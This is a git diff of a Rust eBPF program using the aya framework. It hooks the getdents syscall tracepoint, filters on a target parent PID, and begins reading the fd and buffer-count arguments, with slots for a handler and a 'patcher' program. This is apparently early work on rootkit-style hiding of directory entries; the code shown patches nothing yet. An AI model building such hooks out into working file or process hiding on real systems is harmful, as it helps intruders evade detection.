@@ -1,5 +1,6 @@
 #![no_std]
 #![no_main]
+
 use core::mem::{self, offset_of};
 
 use aya_ebpf::{
@@ -7,12 +8,13 @@ use aya_ebpf::{
     macros::{map, tracepoint},
     maps::ProgramArray,
     programs::TracePointContext,
+    EbpfContext,
 };
 use aya_log_ebpf::info;
+use vmlinux::vmlinux::task_struct;
 
+#[path = "./vmlinux/mod.rs"]
 mod vmlinux;
-
-use vmlinux::task_struct;
 
 const PROG_HANDLER: u32 = 0;
 const PROG_PATCHER: u32 = 1;
@@ -46,12 +48,17 @@ fn handle_getdents_enter(ctx: TracePointContext) -> Result<u32, u32> {
             .unwrap()
         };
 
-        info!(&ctx, "ppid is {}", ppid);
-
-        if ppid == trarget_ppid {
-            info!(&ctx, "We have found it: {}", ppid);
+        if ppid != trarget_ppid {
+            return Ok(0);
         }
     }
+
+    let pid = pid_tgid >> 32;
+    let fd: u32 = unsafe { ctx.read_at(16).unwrap() };
+    let buff_count: u32 = unsafe { ctx.read_at(32).unwrap() };
+
+    // let dirp:  = unsafe { ctx.read_at(24).unwrap() };
+
     Ok(0)
 }
 
